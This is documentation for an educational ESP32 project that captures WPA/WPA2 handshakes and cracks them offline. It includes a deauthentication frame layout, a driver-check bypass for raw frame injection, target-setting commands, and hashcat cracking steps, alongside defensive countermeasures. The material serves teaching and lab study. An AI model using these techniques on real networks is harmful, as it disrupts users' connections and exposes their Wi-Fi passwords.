# WPA Handshake Capture — Complete Documentation

> **Project:** Educational WPA/WPA2 Handshake Capture & Cracking  
> **Hardware:** ESP32 DOIT DevKit V1  
> **Framework:** PlatformIO (Arduino)  
> **Last Updated:** 2026-05-25

---

## 1. What Is This?

This is an **educational WPA/WPA2 handshake capture tool** that runs on an ESP32. It demonstrates how the 4-way handshake between a Wi-Fi client and an Access Point can be captured passively, and how that handshake can be used to crack the network password on a more powerful computer.

The project includes:

1. **ESP32 Firmware** — Captures EAPOL (Extensible Authentication Protocol over LAN) key frames from the 4-way WPA handshake
2. **Deauthentication Engine** — Optionally forces a client to reconnect, triggering a new handshake
3. **PCAP Generator** — Python tool to convert captured handshakes to Wireshark-compatible PCAP files
4. **Hashcat Converter** — Converts handshakes to hashcat mode 22000 format
5. **Automated Cracker** — Runs hashcat or aircrack-ng to attempt password recovery
6. **Wi-Fi Scanner** — Auxiliary ESP32 firmware to discover nearby APs

### The 4-Way Handshake

When a WPA/WPA2 client connects to an AP, a cryptographic handshake occurs:

```
AP (Authenticator)                    Client (Supplicant)
       │                                      │
       │─────────── M1: ANonce ──────────────│
       │                                      │
       │─────────── M2: SNonce + MIC ────────│
       │                                      │
       │─────────── M3: GTK + MIC ───────────│
       │                                      │
       │─────────── M4: ACK ─────────────────│
       │                                      │
```

- **M1**: AP sends its random nonce (ANonce) to the client
- **M2**: Client sends its random nonce (SNonce) + Message Integrity Code (MIC) — the MIC proves the client knows the password
- **M3**: AP sends the Group Temporal Key (GTK) + MIC
- **M4**: Client acknowledges

The **minimum requirement** for cracking is **M1 + M2**. With these two messages and the SSID name, a cracking tool can attempt to derive the Pairwise Master Key (PMK) and verify it against the MIC in M2.

### Educational Purpose

- Understand how WPA/WPA2 encryption works (PMK, PTK, ANonce, SNonce, MIC)
- Learn how the 4-way handshake can be captured without authentication
- See the relationship between password strength and crackability
- Understand countermeasures like WPA3-SAE and 802.1X

---

## 2. Architecture Overview

### 2.1 ESP32 Firmware

```
main.cpp                    Entry point, FreeRTOS task, module init
├── wifi_manager.{h,cpp}    Wi-Fi init, channel set, promiscuous mode
├── handshake_sniffer.{h,cpp} EAPOL frame detection + capture + SPIFFS storage
├── deauth_engine.{h,cpp}   Deauthentication frame injection
└── serial_cli.{h,cpp}      CLI with 15+ commands + NVS config persistence
```

### 2.2 Python Tools (in `tools/`)

```
tools/
├── capture_handshake.py     -- Auto-capture from ESP32 serial
├── convert_handshake.py     -- ESP32 binary -> hashcat 22000
├── crack_handshake.py       -- Auto-cracker with hashcat/aircrack
├── create_pcap.py           -- ESP32 binary -> PCAP for Wireshark
├── find_ap_info.sh          -- Auto-detect AP info from Linux
├── wordlists/
│   ├── tiny.txt             -- 26 entries (basic test)
│   ├── common.txt           -- 114 entries (extended)
│   └── lab.txt              -- 90 entries (focused on labs)
└── esp32_scanner/
    └── src/main.cpp         -- Standalone Wi-Fi scanner firmware
```

---

## 3. How It Works (Step by Step)

### 3.1 Discovery Phase

First, the user identifies the target AP using the Wi-Fi scanner (separate firmware upload) or by running `find_ap_info.sh` on their laptop:

```bash
./tools/find_ap_info.sh
```

This outputs:
```
SSID:       MyHotspot
BSSID:      46:5C:B8:8B:E3:61
Channel:    6
STA MAC:    E0:D4:64:C2:C5:54
```

### 3.2 Configuration Phase

The user configures the ESP32 via serial CLI:

```
set_ssid MyHotspot
set_bssid 46:5C:B8:8B:E3:61
set_channel 6
set_stamac E0:D4:64:C2:C5:54
```

- **SSID**: Network name (used in the hashcat 22000 format)
- **BSSID**: AP's MAC address (filter on this to ignore other APs)
- **Channel**: Which 2.4 GHz channel to monitor
- **STA MAC**: (Optional) Client MAC filter — only capture handshakes involving this client

### 3.3 Sniffing Phase

When `start` is issued:

1. The ESP32 switches to the specified channel
2. Promiscuous mode is enabled (all 802.11 frames are received)
3. Every received frame is checked:
   - Is it a Data frame (type 0x08 or 0x88)?
   - Does it match the BSSID filter?
   - Does it match the STA MAC filter (if set)?
   - Does it have a LLC/SNAP header followed by EtherType 0x888E (EAPOL)?
   - Is the EAPOL packet type 3 (EAPOL-Key)?

4. If an EAPOL-Key frame is detected, the type is determined by parsing the Key Information field:

```cpp
bool key_ack  = (key_info >> 7) & 0x1;
bool key_mic  = (key_info >> 8) & 0x1;
bool secure   = (key_info >> 9) & 0x1;

if (key_ack && !key_mic && !secure)      msg_type = 1;  // M1
else if (!key_ack && key_mic && !secure) msg_type = 2;  // M2
else if (key_ack && key_mic && secure)   msg_type = 3;  // M3
else if (!key_ack && key_mic && secure)  msg_type = 4;  // M4
```

5. Each message is stored:
   - M1: ANonce (32 bytes) stored
   - M2: SNonce (32 bytes) + MIC (16 bytes) stored
   - M3: MIC (16 bytes) stored
   - M4: Acknowledgement stored

6. When M1 + M2 are both captured, the handshake is **complete** and ready for cracking.

### 3.4 Deauthentication (Optional, Accelerates Capture)

If a target client is already connected and not reconnecting, the handshake may not be observable. The deauth engine forces a reconnect:

```
deauth_start
```

This sends **deauthentication frames** (802.11 management frame type 0xC0) every 500ms to the target client (or broadcast) claiming to be from the AP. The client believes it has been disconnected and immediately attempts to reconnect — generating a fresh 4-way handshake.

**How a deauth frame is constructed:**

```cpp
uint8_t deauth_packet[26] = {
    0xC0, 0x00,                      // Frame Control: Deauth
    0x00, 0x00,                      // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Addr1: Target STA (or broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr2: AP BSSID (set dynamically)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr3: AP BSSID (set dynamically)
    0x00, 0x00                       // Sequence control
};
```

### 3.5 Saving the Handshake

Once the handshake is captured:

```
save
```

This writes the handshake to **SPIFFS** (SPI Flash File System) on the ESP32 as `/handshake.bin`. The binary format is:

```
[Magic: "WPA1" (4 bytes)]
[BSSID (6 bytes)]
[STA MAC (6 bytes)]
[SSID length (1 byte)]
[SSID (32 bytes, padded with zeros)]
[ANonce (32 bytes)]
[SNonce (32 bytes)]
[MIC M2 (16 bytes)]
[MIC M3 (16 bytes)]
[M1 length (2 bytes)]
[M2 length (2 bytes)]
[M3 length (2 bytes)]
[M4 length (2 bytes)]
[M1 data (variable)]
[M2 data (variable)]
[M3 data (variable)]
[M4 data (variable)]
```

Total size: typically ~300-500 bytes per handshake.

### 3.6 Extracting the Handshake

Two methods:

**Method 1: Serial dump**
```
dump_raw
```
The ESP32 outputs the binary handshake over serial, framed by `---RAW START---` and `---RAW END---` markers. The Python script `capture_handshake.py` automates this:

```bash
python3 tools/capture_handshake.py /dev/ttyUSB0
```

**Method 2: SPIFFS read** (not implemented — requires web server or file download)

### 3.7 Converting to Crackable Formats

**To hashcat 22000 format:**
```bash
python3 tools/convert_handshake.py files/handshake.bin
```
Output: `files/handshake.bin.22000`

**To PCAP (Wireshark):**
```bash
python3 tools/create_pcap.py
```
Output: `tools/handshake.pcap`

### 3.8 Cracking

```bash
python3 tools/crack_handshake.py
```

This auto-finds the .22000 file and runs:
1. **hashcat** (GPU mode, falls back to CPU mode)
2. **aircrack-ng** (if hashcat fails)

With the included `tiny.txt` wordlist (26 entries), cracking takes under a second if the password is in the list.

---

## 4. Problems Encountered During Implementation

### Problem 1: EAPOL Frame Detection

**Symptom:** The sniffer captured many packets but never detected EAPOL frames, even when a client was connecting.

**Root cause:** EAPOL frames use LLC/SNAP encapsulation (not raw EtherType). The LLC header bytes `AA AA 03 00 00 00` must precede the `88 8E` EtherType. Additionally, the 802.11 header type (QoS vs non-QoS) changes the header length, and we were using the wrong offset.

**Solution:** Correctly parse the Frame Control field to determine the header length:
```cpp
int hdr_len = (frame_type == 0x88) ? 26 : 24;
```
QoS data frames (frame type 0x88) have a 2-byte QoS Control field after the standard 24-byte header.

### Problem 2: Message Type Detection

**Symptom:** EAPOL-Key frames were detected but their message type (M1-M4) was misidentified.

**Root cause:** The Key Information field in the EAPOL-Key frame has complex bit flags. The original code checked `key_ack`, `key_mic`, and `secure` in the wrong combination. For example, M3 has `key_ack=1, key_mic=1, secure=1` but so does M4 in some implementations.

**Solution:** Implemented the standard detection logic from the IEEE 802.11i specification:
```
M1: key_ack=1, key_mic=0, secure=0
M2: key_ack=0, key_mic=1, secure=0
M3: key_ack=1, key_mic=1, secure=1
M4: key_ack=0, key_mic=1, secure=1
```

### Problem 3: Promiscuous Mode vs. Monitor Mode

**Symptom:** The ESP32's promiscuous mode only captured frames with the correct FCS (Frame Check Sequence). Many frames, especially deauth frames, were dropped by the Wi-Fi hardware before reaching the callback.

**Root cause:** The ESP32's `esp_wifi_set_promiscuous()` does NOT provide true monitor mode — it cannot capture frames with invalid FCS or corrupted headers. This is a hardware limitation of the ESP32's Wi-Fi radio.

**Solution:** Accepted as a limitation. The ESP32 can only capture clean frames. This is sufficient for handshake capture (EAPOL frames are always valid) but limits debugging of injection problems.

### Problem 4: Driver Bypass for Deauth Injection

**Symptom:** `esp_wifi_80211_tx()` returned `ESP_OK` but no deauth frames appeared on the air.

**Root cause:** Same as the ARP Spoof project — the `ieee80211_raw_frame_sanity_check()` driver filter blocks raw frame injection.

**Solution:** Same bypass:
```cpp
extern "C" {
    int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
        return 0;
    }
}
```
With the linker flag `-Wl,--allow-multiple-definition`.

### Problem 5: SPIFFS Corruption

**Symptom:** After saving multiple handshakes, SPIFFS would become corrupted and the ESP32 would crash on boot.

**Root cause:** SPIFFS has known issues with rapid write/erase cycles. The ESP32's flash has limited erase cycles (~100,000 per sector) but more critically, SPIFFS can leave the filesystem in an inconsistent state if power is lost during a write.

**Solution:** Call `SPIFFS.begin(true)` to auto-format on corruption. Also limit writes to once per handshake save (not on every capture).

### Problem 6: Raw Dump Binary Corruption

**Symptom:** The `dump_raw` output would occasionally have extra or missing bytes when parsed by the Python script.

**Root cause:** The serial output uses `Serial.write()` for binary data, but `Serial.println()` is interspersed for framing. If the serial buffer fills up, bytes can be lost. The `---RAW START---` / `---RAW END---` markers help the Python script locate the binary data.

**Solution:** Added a small delay after the raw dump to let the serial buffer drain. The Python script also uses `\r\n` stripped from the binary payload to handle platform-specific line endings.

### Problem 7: Hashcat 22000 Format Compatibility

**Symptom:** Hashcat would reject the .22000 file with "Invalid handshake" errors.

**Root cause:** The hashcat 22000 format requires specific field ordering, hex encoding, and includes the MIC in a specific position. The original converter implementation had field ordering that didn't match hashcat's expectations.

**Solution:** Studied the hashcat 22000 format specification:
```
WPA*<msg_type>*<mic_hex>*<bssid_hex>*<stamac_hex>*<ssid_hex>*<anonce_hex>*<eapol_hex>*<eapol_len_hex>
```
Each field must be properly hex-encoded and in the correct order.

### Problem 8: Deauth Broadcast vs. Targeted

**Symptom:** Broadcast deauth (addressing all clients) would disconnect the ESP32 itself.

**Root cause:** The ESP32 was connected as a STA to the AP. Sending a deauth frame with a broadcast destination (`FF:FF:FF:FF:FF:FF`) would cause the AP to deauthenticate ALL clients, including the ESP32 itself.

**Solution:** Default to **targeted deauth** (addressing the specific client MAC). Broadcast deauth is available as an option but must be used carefully.

---

## 5. ESP32 Hardware Limitations

### 5.1 Single Radio / No Monitor Mode

The ESP32's Wi-Fi subsystem:
- Has a single 2.4 GHz radio (no 5 GHz)
- Supports promiscuous mode (receive all frames) but NOT true monitor mode
- Cannot capture frames with invalid FCS
- Cannot capture on multiple channels simultaneously
- Cannot maintain a Wi-Fi connection while in promiscuous mode

**Impact:** The ESP32 can only capture handshakes on one channel at a time. To capture handshakes on channel-hopping APs, the ESP32 must stay on the target's channel.

### 5.2 Limited Capture Buffer

The promiscuous callback receives frames in interrupt context. Each frame must be processed quickly. The ESP32 can buffer incoming frames but:
- The Wi-Fi MAC layer has a limited RX FIFO (~100 frames at typical packet sizes)
- If the callback is too slow, frames are dropped
- Heap fragmentation limits long-term capture storage

**Impact:** In environments with many active clients, some EAPOL frames may be missed. This is acceptable for handshake capture (you only need one successful M1+M2 pair).

### 5.3 SPIFFS Reliability

SPIFFS on the ESP32:
- Max file size: limited by flash partition (typically ~1.5 MB on a 4 MB flash)
- Limited write endurance (~100,000 sector erase cycles)
- No wear leveling (compared to LittleFS)
- Risk of corruption on power loss during write

**Impact:** Use SPIFFS for handshake storage but treat it as temporary. Offload handshakes to a laptop promptly.

### 5.4 No Hardware WPA Cracking

The ESP32 has AES hardware acceleration but:
- Cannot run hashcat (x86-only)
- Cannot run aircrack-ng (Linux x86/ARM)
- Limited RAM (520 KB) is insufficient for PBKDF2 iteration needed for PMK derivation

**Impact:** The ESP32 captures handshakes but cannot crack them. A laptop is required.

### 5.5 2.4 GHz Only

The ESP32's radio operates only on 2.4 GHz. It cannot capture handshakes from:
- 5 GHz Wi-Fi networks
- 6 GHz Wi-Fi 6E networks

**Impact:** The project only works with 2.4 GHz networks. For 5 GHz, an ESP32-S3 or external radio would be needed (and even then, 5 GHz promiscuous mode is not well supported).

### 5.6 Transmission Power

The ESP32's maximum transmit power is approximately **19.5 dBm** (~89 mW). This is lower than most laptops' Wi-Fi adapters (~20-23 dBm). The deauth frames may not reach distant clients.

**Impact:** The deauth engine works best when the ESP32 is physically close to the target client.

---

## 6. How to Test

### 6.1 Prerequisites

**Hardware:**
- ESP32 DOIT DevKit V1
- A Wi-Fi AP with WPA2-PSK security (any consumer router)
- A client device (laptop/phone) that will connect to the AP
- USB cable for serial

**Software:**
- PlatformIO
- Python 3 with `pyserial` installed (`pip install pyserial`)
- (Optional) hashcat or aircrack-ng for cracking
- (Optional) Wireshark for PCAP verification

### 6.2 Build and Flash

#### Main Handshake Capture Firmware:
```bash
cd "WPA Handshake Capture"
pio run
pio run --target upload
pio device monitor
```

#### Wi-Fi Scanner (separate firmware):
```bash
cd "WPA Handshake Capture/tools/esp32_scanner"
pio run
pio run --target upload
pio device monitor
```

### 6.3 Test Plan

#### Test 1: Wi-Fi Scanner (Discover Target)

1. Flash the scanner firmware
2. Open serial monitor
3. Observe the list of nearby networks

**Expected output:**
```
[*] Scanning...

[+] Found 5 networks:

SSID                          | Ch | RSSI  | BSSID
------------------------------|----|-------|-------------------
MyHotspot                     |  6 |  -45  | 46:5C:B8:8B:E3:61
NeighborWiFi                  | 11 |  -72  | AA:BB:CC:DD:EE:FF
...
```

Record the target's SSID, BSSID, and Channel.

#### Test 2: Passive Handshake Capture

1. Flash the main capture firmware
2. Configure target:
   ```
   set_ssid MyHotspot
   set_bssid 46:5C:B8:8B:E3:61
   set_channel 6
   ```
3. Start sniffing:
   ```
   start
   ```
4. Have a client device connect to MyHotspot (or force reconnect)
5. Watch the serial output

**Expected:**
```
[Sniffer] STARTED
[Sniffer] Ch=6  BSSID=46:5C:B8:8B:E3:61
[HS] M1/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
[HS] M2/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
[HS] *** COMPLETE HANDSHAKE (M1+M2) ***
```

6. Check status:
   ```
   status
   ```

**Expected:**
```
M1: YES  M2: YES  M3: no  M4: no
EAPOL frames seen: 2
BSSID: 46:5C:B8:8B:E3:61
STA:   E0:D4:64:C2:C5:54
```

#### Test 3: Deauth-Triggered Handshake

1. Ensure a client is connected to the target AP
2. Start the sniffer:
   ```
   start
   ```
3. Start deauth:
   ```
   deauth_start
   ```
4. The client disconnects and immediately reconnects (the 4-way handshake is visible)

**Expected:**
```
[Deauth] Started
[Deauth] Sent
[Deauth] Sent
[HS] M1/4 captured  ...
[HS] M2/4 captured  ...
[HS] *** COMPLETE HANDSHAKE (M1+M2) ***
```

**Note:** The deauth may not work if the AP detects and ignores it. Try multiple times or move the ESP32 closer.

#### Test 4: Save and Dump

1. After a handshake is captured:
   ```
   save
   dump_raw
   ```

**Expected:**
```
[HS] Saved to /handshake.bin

---RAW START---
<binary data — will show as garbage on terminal>
---RAW END---
[HS] Raw dump complete
```

#### Test 5: Python Capture Tool

```bash
# Save the ESP32's handshake to a file
python3 tools/capture_handshake.py /dev/ttyUSB0
```

**Expected:**
```
[*] Opening /dev/ttyUSB0 at 115200 baud...
[*] Sending 'load' and 'dump_raw'...
[+] Saved 312 bytes to files/handshake.bin
```

#### Test 6: Convert to Hashcat Format

```bash
python3 tools/convert_handshake.py files/handshake.bin
```

**Expected:**
```
[+] Saved hashcat 22000 format to: files/handshake.bin.22000
```

Check the output:
```bash
cat files/handshake.bin.22000
```

Should show one or more lines starting with `WPA*01*...` and `WPA*02*...`.

#### Test 7: Create PCAP for Wireshark

**Note:** The PCAP tool uses hardcoded dummy EAPOL data — it's a template. For a real capture, you need to modify the script with actual EAPOL hex data:

```bash
python3 tools/create_pcap.py
```

**Expected:**
```
[+] PCAP written to: tools/handshake.pcap
[+] Frames: 4 (M1, M2, M3, M4)
[+] Open in Wireshark to verify the handshake
```

Open in Wireshark:
```bash
wireshark tools/handshake.pcap
```
Filter: `eapol`

#### Test 8: Cracking (with tiny wordlist)

```bash
python3 tools/crack_handshake.py
```

This auto-detects the .22000 file and uses the smallest wordlist.

**Expected (if password is in the wordlist):**
```
============================================================
  RESULT: Password cracked successfully!
============================================================
```

**Expected (if password is NOT in the wordlist):**
```
============================================================
  RESULT: Password not found.
============================================================
```

### 6.4 Testing with Custom Password

For a reliable test:

1. Set the AP's password to something in the `tiny.txt` wordlist, e.g., `password123`
2. Capture the handshake (Test 2)
3. Run the cracker (Test 8)
4. **Expected:** The password `password123` should be found instantly

Then try with a password NOT in the wordlist to verify the "not found" case.

### 6.5 Verification with Wireshark (Full PCAP)

For a proper PCAP with real captured data:

1. Capture a handshake with the ESP32
2. Use `dump_raw` and save the binary
3. Write a quick Python script to insert the real EAPOL hex data into the `create_pcap.py` template
4. Open the PCAP in Wireshark
5. Filter: `eapol`
6. Observe the 4-way handshake frames
7. Verify: `wlan.fc.type_subtype == 0x08` for data frames containing EAPOL

---

## 7. Limitations of This Implementation

| Limitation | Reason | Impact |
|------------|--------|--------|
| **2.4 GHz only** | ESP32 radio hardware | Cannot capture 5 GHz networks |
| **No true monitor mode** | ESP32 Wi-Fi driver | Cannot capture corrupted frames |
| **Single channel** | One radio | Must know target channel in advance |
| **Deauth may not work** | AP may ignore deauth frames | May need passive capture (wait for reconnect) |
| **SPIFFS reliability** | Flash storage limitations | Handshakes can be lost on power loss |
| **Hardcoded PCAP examples** | create_pcap.py uses dummy data | Must manually insert real hex data |
| **No real-time capture script** | capture_handshake.py sends commands | Requires user to have already captured |

---

## 8. Defensive Countermeasures

What this lab teaches students to defend against:

1. **WPA3-SAE** — Replaces the 4-way handshake with Simultaneous Authentication of Equals (SAE), which provides forward secrecy and is resistant to offline dictionary attacks
2. **Strong Passwords** — A 12+ character random password makes cracking infeasible even with the handshake. **Example:** `J8k#mP2$vL9@nQ5*` would take centuries to crack.
3. **802.1X / WPA-Enterprise** — Uses per-user credentials (RADIUS server), not a shared PSK. Capturing one client's handshake does not compromise the entire network.
4. **PMF (Protected Management Frames)** — 802.11w protects deauth/disassoc frames with encryption, preventing deauth attacks
5. **Deauth Detection** — WIPS (Wireless Intrusion Prevention Systems) can detect deauth floods and alert administrators
6. **Guest Network Isolation** — Separate VLAN for guest devices prevents lateral movement
7. **WPA2-AES only** (no TKIP) — TKIP is vulnerable to additional attacks (Michael, Beck-Tews)

### Why Cracking Works

The password is protected by PBKDF2 (Password-Based Key Derivation Function 2):
```
PMK = PBKDF2(password, SSID, 4096, 256)
```

Each candidate password requires 4096 HMAC-SHA1 iterations. With a GPU (NVIDIA RTX 4090), hashcat can test **~2 million passwords/second** in mode 22000. A 14-million-word rockyou.txt dictionary takes ~7 seconds.

But a truly random 12-character password has ~3.6 × 10^23 possibilities — completely infeasible.

---

## 9. File Reference

| File | Purpose |
|------|---------|
| `platformio.ini` | Build config with driver bypass + SPIFFS |
| `src/main.cpp` | Entry point, FreeRTOS task, driver bypass |
| `src/handshake_sniffer.cpp` | EAPOL capture, M1-M4 detection, SPIFFS storage |
| `src/handshake_sniffer.h` | Sniffer function declarations |
| `src/deauth_engine.cpp` | Deauth frame construction and injection |
| `src/deauth_engine.h` | Deauth function declarations |
| `src/serial_cli.cpp` | CLI with 15 commands + NVS config |
| `src/serial_cli.h` | CLI function declarations |
| `src/wifi_manager.cpp` | Promiscuous mode, channel switching |
| `src/wifi_manager.h` | WiFi function declarations |
| `tools/capture_handshake.py` | Auto-capture binary from serial |
| `tools/convert_handshake.py` | Binary -> hashcat 22000 format |
| `tools/crack_handshake.py` | Automated cracking (hashcat/aircrack) |
| `tools/create_pcap.py` | Binary -> Wireshark PCAP |
| `tools/find_ap_info.sh` | Auto-detect AP info from Linux |
| `tools/wordlists/` | Password wordlists (tiny/common/lab) |
| `tools/esp32_scanner/src/main.cpp` | Standalone Wi-Fi scanner firmware |
